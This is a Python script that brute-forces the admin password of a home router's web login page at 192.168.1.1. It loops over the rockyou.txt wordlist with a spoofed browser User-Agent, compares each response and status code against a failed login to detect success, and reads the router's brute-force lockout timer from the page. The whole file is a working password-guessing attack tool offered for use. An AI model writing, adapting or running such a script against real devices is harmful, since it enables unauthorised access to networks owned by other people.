from multiprocessing.dummy import Pool as ThreadPool
import requests
import re
import os
from colorama import init, Fore, Style
import threading
from time import sleep

init(convert=True)
init(autoreset=True)

bright = Style.BRIGHT
dim = Style.DIM
red = Fore.RED + bright + dim
green = Fore.GREEN + bright + dim
cyan = Fore.CYAN + bright + dim
yellow = Fore.LIGHTYELLOW_EX + bright + dim
blue = Fore.BLUE + bright + dim
magenta = Fore.MAGENTA + bright + dim

ROUTER_URL = "http://192.168.1.1/"
LOGIN_URL = "te_acceso_router.cgi"
CHECK_URL = "te_acceso_router.html"

threads = 2
wordlist = "rockyou.txt"
fakeHeader = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
parametrosLogin = {
    "Upgrade-Insecure-Requests": "1",
    "loginPassword": ""
}

session = requests.Session()
pool = ThreadPool(threads)

def main(passw):
    req = session.get(ROUTER_URL, headers=fakeHeader)

    parametrosLogin["loginPassword"] = passw
    iniReq = session.post(ROUTER_URL+LOGIN_URL, headers=fakeHeader, params=parametrosLogin)

    errorResponse = iniReq.text
    errorStatus = iniReq.status_code
    errorCookie = session.cookies.get_dict()

    print("Generated cookie: {}".format(errorCookie))
    print("Current password: {}".format(parametrosLogin["loginPassword"]))

    logReq = session.post(ROUTER_URL+LOGIN_URL, headers=fakeHeader, params=parametrosLogin)

    if logReq.text != errorResponse:
        print(green + "Different response:")
        print(logReq.text)
        os.system("msg * Diff response")

    if errorStatus != logReq.status_code:
        print(green + "Different status code: {}".format(logReq.status_code))
        os.system("msg * Diff status")

    checkReq = session.get(ROUTER_URL+CHECK_URL, headers=fakeHeader)

    m = re.search('var bruteTime = \'(.+?)\';', checkReq.text)
    if m:
        found = m.group(1)
        print("Bruteforce timer: {}".format(found))

os.system("cls")

f = open(wordlist, "r", encoding="utf8", errors="ignore")
content = f.read()
content_list = content.splitlines()
f.close()

for passw in content_list:
    thread = threading.Thread(target=main, args=[passw])
    thread.start()
    sleep(0.25)
